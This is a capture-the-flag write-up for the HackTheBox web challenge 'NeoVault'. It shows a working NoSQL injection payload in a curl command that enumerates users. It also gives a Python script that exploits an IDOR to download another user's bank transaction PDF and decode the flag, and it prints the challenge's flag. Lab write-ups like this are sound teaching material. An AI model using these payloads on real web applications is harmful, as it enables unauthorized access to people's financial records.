---
title: "NeoVault"
ctf: "HackTheBox"
date: 2026-05-22
category: web
difficulty: easy
flag_format: "HTB{...}"
---

# NeoVault

## Summary

A Next.js banking application exposed both V1 and V2 API endpoints. The V1 `download-transactions` endpoint had an IDOR vulnerability, allowing downloading any user's transaction statement by specifying their `_id`. A user named `user_with_flag` had the flag in a self-transfer transaction description.

## Solution

### Step 1: Discover API Endpoints

Found V1 and V2 API endpoints in the client-side JS chunk at `/_next/static/chunks/app/page-f326b61d68452abd.js`. V2 had an `inquireUser` endpoint not present in V1.

### Step 2: Identify V1 IDOR

V1 endpoints returned error messages revealing they used different code paths. The endpoint `POST /api/v1/transactions/download-transactions` accepted an `_id` parameter without verifying ownership, leaking other users' transaction data.

### Step 3: Enumerate Users

Used NoSQL injection on the V2 inquire endpoint to find users:

```bash
curl -G "http://target:31572/api/v2/auth/inquire" \
  --data-urlencode 'username[$ne]=' \
  -H "Cookie: token=<session>"
```

This returned `neo_system`. Downloaded their transaction PDF which revealed a transfer to `user_with_flag`.

### Step 4: Download Flag

Looked up `user_with_flag`'s ID via the inquire endpoint, then downloaded their statement via the V1 IDOR:

```python
import requests, zlib, re

TOKEN = "<session>"
USER_ID = "6a106c4e92d92dcc185572f1"

r = requests.post(
    "http://target:31572/api/v1/transactions/download-transactions",
    json={"_id": USER_ID},
    cookies={"token": TOKEN}
)

for match in re.finditer(rb'stream\s(.+?)\s*endstream', r.content, re.DOTALL):
    raw = match.group(1).strip()
    try:
        decompressed = zlib.decompress(raw)
        hex_strings = re.findall(r'<([0-9a-fA-F]+)>', decompressed.decode('latin-1'))
        for h in hex_strings:
            print(bytes.fromhex(h).decode('utf-8', errors='replace'), end='')
    except:
        pass
```

The PDF contained `user_with_flag`'s self-transfer with description containing the flag.

## Flag

```
HTB{n0t_s0_3asy_1d0r}
```
